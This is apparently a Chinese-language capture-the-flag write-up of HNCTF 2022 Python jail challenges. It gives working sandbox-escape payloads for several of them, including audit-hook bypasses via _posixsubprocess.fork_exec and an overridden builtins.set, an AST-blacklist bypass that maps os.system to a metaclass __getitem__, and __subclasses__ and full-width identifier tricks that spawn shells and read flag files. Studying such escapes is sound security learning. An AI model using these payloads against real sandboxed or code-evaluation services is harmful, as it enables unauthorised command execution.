 | |     | |  |___ \  | |     | |  |___ \  | |     | |  |___ \ 
 | | __ _| | __ __) | | | __ _| | __ __) | | | __ _| | __ __) |
 | |/ _` | |/ /|__ <  | |/ _` | |/ /|__ <  | |/ _` | |/ /|__ < 
 | | (_| |   < ___) | | | (_| |   < ___) | | | (_| |   < ___) |
 |_|\__,_|_|\_\____/  |_|\__,_|_|\_\____/  |_|\__,_|_|\_\____/ 
'''

def main():
    print(WELCOME)
    print('Welcome to my guesser game!')
    game_score = guesser()
    if game_score == 1:
        print('you are really super guesser!!!!')
        # 本地是假 Flag，但远程服务器上会是真实 Flag
        print('flag{fake_flag_in_local_but_really_in_The_remote}')
    else:
        print('Guess game end!!!')

if __name__ == '__main__':
    # 真正挂载审计钩子（放在 main 里是为了在启动时启用）
    sys.addaudithook(my_audit_hook)
    main()
```

上一题ai的做法可以直接梭哈梭出
考点: ==`sys._getframe()`方法查看全局变量==
这里需要学习一下`sys._getframe`方法,参考: https://rrroger.github.io/notebook/python/sys._getframe.html

可以获取调用栈的帧对象，默认的参数是0，但是在这里如果传入0的话就会获取eval的调用栈帧，所以得deep一层

```
__import__("sys")._getframe(1)
```

我们试试看是啥情况，有个小技巧，可以使用`__import__("sys").__stdout__.write`去进行标准输出，这也是上一个非预期的输出方法。

```
__import__("sys").__stdout__.write(str(__import__('sys')._getframe(1)))
```

```
Can u guess the number? between 1 and 9999999999999 > __import__("sys").__stdout__.write(str(__import__('sys')._getframe(1)))
<frame at 0x7f5ab53ad590, file '/home/ctf/./server.py', line 31, code guesser>Guess game end!!!
```

这里的frame对象指向了'/home/ctf/./server.py'这个file，那么直接调用f_locals属性查看变量

```
__import__("sys").__stdout__.write(str(__import__('sys')._getframe(1).f_locals))
Welcome to my guesser game!
Can u guess the number? between 1 and 9999999999999 > __import__("sys").__stdout__.write(str(__import__('sys')._getframe(1).f_locals))
{'game_score': 0, 'right_guesser_question_answer': 4392334357835, 'challenge_original_stdout': <_io.TextIOWrapper name='' mode='w' encoding='utf-8'>}Guess game end!!!
```

我们可以看到获取到了right_guesser_question_answer的值，所以最后的payload为：

```
int(str(__import__('sys')._getframe(1).f_locals["right_guesser_question_answer"]))
或者使用上一题ai的神力
__import__('sys')._getframe(1).f_locals['right_guesser_question_answer']
```

还有一些是我问ai给的回答

- `sys._getframe(n)` 是 Python 的内部调试函数，返回当前调用栈第 **n** 层的**帧对象**
- 帧对象的 `f_locals` 属性是一个**字典**，存储了该层作用域的**所有局部变量**。

### [HNCTF 2022 WEEK2]4 byte command

4 byte因该是只有限制4个字符
使用 sh

```
> sh
sh: 0: can't access tty; job control turned off
$ ls
flag  server.py
$ cat flag
flag=NSSCTF{4e69c454-a6e9-4e0d-b65a-045df5f68c1f}
```

### [HNCTF 2022 WEEK3]s@Fe safeeval(JAIL)

刚连接题目就给我这么多玩意

```python
Warning: _curses.error: setupterm: could not find terminfo database

Terminal features will not be available.  Consider setting TERM variable to your current terminal name (or xterm).

              ______                __                     _
        ____ |  ____|              / _|                   | |
  ___  / __ \| |__ ___   ___  __ _| |_ ___  _____   ____ _| |
 / __|/ / _` |  __/ _ \ / __|/ _` |  _/ _ \/ _ \ \ / / _` | |
 \__ \ | (_| | | |  __/ \__ \ (_| | ||  __/  __/\ V / (_| | |
 |___/\ \__,_|_|  \___| |___/\__,_|_| \___|\___| \_/ \__,_|_|
       \____/                                                                                                           

Turing s@Fe mode: on
Black List:

    [
        'POP_TOP','ROT_TWO','ROT_THREE','ROT_FOUR','DUP_TOP',
        'BUILD_LIST','BUILD_MAP','BUILD_TUPLE','BUILD_SET',
        'BUILD_CONST_KEY_MAP', 'BUILD_STRING','LOAD_CONST','RETURN_VALUE',
        'STORE_SUBSCR', 'STORE_MAP','LIST_TO_TUPLE', 'LIST_EXTEND', 'SET_UPDATE',
        'DICT_UPDATE', 'DICT_MERGE','UNARY_POSITIVE','UNARY_NEGATIVE','UNARY_NOT',
        'UNARY_INVERT','BINARY_POWER','BINARY_MULTIPLY','BINARY_DIVIDE','BINARY_FLOOR_DIVIDE',
        'BINARY_TRUE_DIVIDE','BINARY_MODULO','BINARY_ADD','BINARY_SUBTRACT','BINARY_LSHIFT',
        'BINARY_RSHIFT','BINARY_AND','BINARY_XOR','BINARY_OR','MAKE_FUNCTION', 'CALL_FUNCTION'
    ]

some code:

    import os
    import sys
    import traceback
    import pwnlib.util.safeeval as safeeval
    input_data = input('> ')
    print(expr(input_data))
    def expr(n):
        if TURING_PROTECT_SAFE:
            m = safeeval.test_expr(n, blocklist_codes)
            return eval(m)
        else:
            return safeeval.expr(n)
```

考点: ==lambda调用函数==

```
(lambda:os.system('cat flag'))()
```

### [HNCTF 2022 WEEK3]calc_jail_beginner_level6(JAIL)

```python
Welcome to the python jail
Let's have an beginner jail of calc
Enter your expression and I will evaluate it for you.
White list of audit hook ===> builtins.input,builtins.input/result,exec,compile
Some code of python jail:

dict_global = dict()  # 创建一个空的字典，作为代码执行的“独立小水缸”（隔离的全局命名空间），防止外面的变量被弄脏
while True:            # 无限循环，主人不喊停，我就一直转圈圈
    try:
        input_data = input("> ")  # 从终端捞一行输入，提示符是 "> "
    except EOFError:             # 捕获文件结束信号（比如主人按了 Ctrl+D）
        print()                  # 礼貌地换行
        break                    # 跳出循环，程序结束
    except KeyboardInterrupt:    # 捕获键盘中断（比如主人按了 Ctrl+C 捣乱）
        print('bye~~')           # 傲娇地回一句再见
        continue                 # 但就是不退出，继续下一轮循环，哼！
    if input_data == '':         # 如果主人只敲了个回车，啥也没写
        continue                 # 懒得理你，直接跳过，重新问你要输入

    try:
        # 把输入的字符串编译成字节码，'single' 模式代表“单条语句”（适合算个表达式或赋个值）
        complie_code = compile(input_data, '<string>', 'single')
    except SyntaxError as err:   # 如果主人写了乱七八糟的语法错误
        print(err)               # 把报错信息甩你脸上
        continue                 # 继续下一轮，别想蒙混过关

    try:
        # 正儿八经执行编译好的代码，但只能在“dict_global”这个小水缸里扑腾，影响不到外面的大海
        exec(complie_code, dict_global)
    except Exception as err:     # 运行时出错了（比如除以零、变量不存在）
        print(err)               # 把错误打印出来，但程序绝不崩溃，主打一个“皮实”
```


这篇里面讲有`_posixsubprocess`，参考参考：https://xz.aliyun.com/news/15665

> posixsubprocess 模块是 Python 的内部模块,模块核心功能是 fork_exec 函数，fork_exec 提供了一个非常底层的方式来创建一个新的子进程，并在这个新进程中执行一个指定的程序。但这个模块并没有在 Python 的标准库文档中列出,**每个版本的 Python 可能有所差异**
>
> 它直接调用了操作系统最底层的 `fork` 和 `exec` 命令，用来**新建一个子进程并运行另一个程序**。因为太底层、太危险，所以 Python 官方不保证每个版本都一样，也没写进说明书——一般用户别碰，留给 `subprocess` 模块自己偷偷用就行。

（下面都是抄大佬的wp，看不懂一点）

这道题难度挺大，看了大佬的WP才明白，来源：https://zhuanlan.zhihu.com/p/579183067

这题已经几乎把所有的hook给ban掉了。参考这个writeup：https://ctftime.org/writeup/31883

也就是利用`_posixsubprocess.fork_exec`来实现RCE。不过需要注意，不同的python版本的`_posixsubprocess.fork_exec`接受的参数个数可能不一样：例如本地WSL的python版本为3.8.10，该函数接受17个参数；而远程python版本为3.10.6，该函数和上面的writeup接受21个参数。

而且注意到，直接import _posixsubprocess的话，会触发audit hook：

```
Operation not permitted: import
```

但可以通过如下方法绕过：

```
__builtins__['__loader__'].load_module('_posixsubprocess')
```

或者

```
__loader__.load_module('_posixsubprocess')
```

而且因为是多次exec，所以我们可以输入多行代码：

```
import os
__loader__.load_module('_posixsubprocess').fork_exec([b"/bin/sh"], [b"/bin/sh"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None)
```

```
\> import os
__loader__.load_module('_posixsubprocess').fork_exec([b"/bin/sh"], [b"/bin/sh"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None)
\> 10
\> /bin/sh: 0: can't access tty; job control turned off
$ ls
name 'ls' is not defined
\> cat flag
flag=NSSCTF{2fc7edc8-f1ff-48e4-ae32-57a69231c320}
$
```

**法二（也是抄的）：**

参考: [CTFtime.org / 圣地亚哥 CTF 2021 / HAXLAB — 残局 Pwn / Writeup](https://ctftime.org/writeup/28286)
这题的白名单是通过set函数设置的,我们,而我们可以修改set这个内置函数的值为一个包含os.system的列表
eg

```
__builtins__.set = lambda x: ['builtins.input', 'builtins.input/result','exec', 'compile', 'os.system']
WHITED_EVENTS = set({"builtins.input", "builtins.input/result", "exec", "compile"})
print(WHITED_EVENTS)

#结果:
['builtins.input', 'builtins.input/result', 'exec', 'compile', 'os.system']
```

payload:

```
exec("globals()['__builtins__']['set']=lambda x: ['builtins.input', 'builtins.input/result','exec', 'compile', 'os.system']\nimport os\nos.system('ls')")

exec("globals()['__builtins__']['set']=lambda x: ['builtins.input', 'builtins.input/result','exec', 'compile', 'os.system']\nimport os\nos.system('cat flag')")
```

### [HNCTF 2022 WEEK3]calc_jail_beginner_level6.1(JAIL)

```
Welcome to the python jail
Let's have an beginner jail of calc
Enter your expression and I will evaluate it for you.
White list of audit hook ===> builtins.input,builtins.input/result,exec,compile
Some code of python jail:

    dict_global = dict()
    input_code = input("> ")
    complie_code = compile(input_code, '<string>', 'single')
    exec(complie_code, dict_global)
```

用上一题的法二来做

### [HNCTF 2022 WEEK3]calc_jail_beginner_level7(JAIL)

```
=================================================================================================
==           Welcome to the calc jail beginner level7,It's AST challenge                       ==
==           Menu list:                                                                        ==
==             [G]et the blacklist AST                                                         ==
==             [E]xecute the python code                                                       ==
==             [Q]uit jail challenge                                                           ==
=================================================================================================
```

输入G

```
G
=================================================================================================
==        Black List AST:                                                                      ==
==                       'Import,ImportFrom,Call,Expr,Add,Lambda,FunctionDef,AsyncFunctionDef  ==
==                        Sub,Mult,Div,Del'                                                    ==
=================================================================================================
```

考点: ==AST生成树的类型绕过(metaclass方法绕过Call类型)==

看大佬博客发现需要学一个魔术方法`metaclass`,链接: https://zhuanlan.zhihu.com/p/149126959
这个方法可以给原生类添加新的属性

```
class ListMeta(type):
    def __new__(cls, name, bases, attrs):
        # 在类属性当中添加了add函数
        # 通过匿名函数映射到append函数上
        attrs['add'] = lambda self, value: self.append(value)
        return super().__new__(cls, name, bases, attrs)


class MyList(list, metaclass=ListMeta):
    pass
lt=MyList()
print(lt)
lt.add(3)
print(lt)

#[]
#[3]
```

现在可以把一个类的一个属性改为`os.system函数`,调用的时候可以直接执行,这里需要用到`__getitem`,本来是获取列表或字典的值的一个属性

```
import os
class jmx():
    pass
jmx.__getitem__=os.system
jmx()['whoami']
```

而此时ast生成树有黑名单的`Expr`和`Call`

```
import ast
src="""import os
class jmx():
    pass
jmx.__getitem__=os.system
jmx()['whoami']"""
ast_code=ast.parse(src,"test4.py",mode="exec")
print(ast.dump(ast_code))
```

Expr可以通过赋值绕过
Call可以用metaclass给类添加属性绕过,这样不是类生成的对象有这个属性,这样我们就不用调用实例化类的Call
payload:

```
import os
class jmx(type):
    __getitem__=os.system
class evil(metaclass=jmx):
    pass
poc=evil['sh']
--HNCTF
```

这里发现Import也ban了.而题目环境是有os的,所以我们把`import os`删了就行

```
class jmx(type):
    __getitem__=os.system
class evil(metaclass=jmx):
    pass
poc=evil['sh']
 
```

![image2](/images/pyjail沙箱逃逸/image2.png)

### 一些函数

1. `__builtins__`：Python内建命名空间入口

   ```
   (__builtins__,'open')('/tmp/flag').read()
   相当于
   (open('/tmp/flag').read())
   ```

2. getattr：动态取属性

   ```
   print(getattr(__builtins__,'open')('/tmp/flag').read())
   相当于
   print(open('/tmp/flag').read())
   ```

3. subclasses：寻找内建函数

   ```
   print([].__class__.__base__.__subclasses__())	//获取所有直接⼦类的列表
   找到os或者什么的就可以进一步使用
   [].__class__.__base__.__subclasses__()[158].__init__.__globals__['__builtins__']
   ```

4. 全角标识符绕过无数字无字母

   ```
   _=[]==[]      # True，也就是 1
   __=_+_        # 2
   ___=__+__     # 4
   ____=___+___  # 8
   _____=____+____
   ______=_____+_____
   _______=______+______
   ```

   ```
   _=[]==[];__=_+_;___=__+__;____=___+___;_____=____+____;______=_____+_____;_______=______+______;ｐｒｉｎｔ(ｏｐｅｎ(ｃｈｒ(______+____+___+__+_)+ｃｈｒ(_______+______+_____+___)+ｃｈｒ(_______+______+____+___+_)+ｃｈｒ(_______+______+_____)+ｃｈｒ(______+____+___+__+_)+ｃｈｒ(_______+______+___+__)+ｃｈｒ(_______+______+____+___)+ｃｈｒ(_______+______+_)+ｃｈｒ(_______+______+___+__+_)).ｒｅａｄ())
   相当于
   ｐｒｉｎｔ(ｏｐｅｎ(/tmp/flag).ｒｅａｄ())
   ```

   有一个神秘脚本（全角数字）

   ```
   def half2full(half):
       full = ''
       for ch in half:
           if ord(ch) in range(33, 127):
               ch = chr(ord(ch) + 0xfee0)
           elif ord(ch) == 32:
               ch = chr(0x3000)
           else:
               pass
           full += ch
       return full
   string = input("input: ")
   result = ''
   def str2chr(s):
       global  result
       for i in s:
           result += "chr("+half2full(str(ord(i)))+")%2b"
   str2chr(string)
   print(result[:-3])
   ```

### hook是啥意思

**基于audit hook的沙箱**

> Python 3.8 中引入的一种 audit hook 的**新特性**。审计钩子可以**用来监控和记录 Python 程序在运行时的行为**，特别是那些安全敏感的行为，如文件的读写、网络通信和动态代码的执行等。
>
> “钩子”是一种特殊的消息处理机制，它可以监视系统或者进程中的各种事件消息，截获发往目标窗口的消息并进行处理。我们可以在系统中自定义钩子，用来监视系统中特定事件的发生，完成特定功能，如屏幕取词，监视日志，截获键盘、鼠标输入等等。

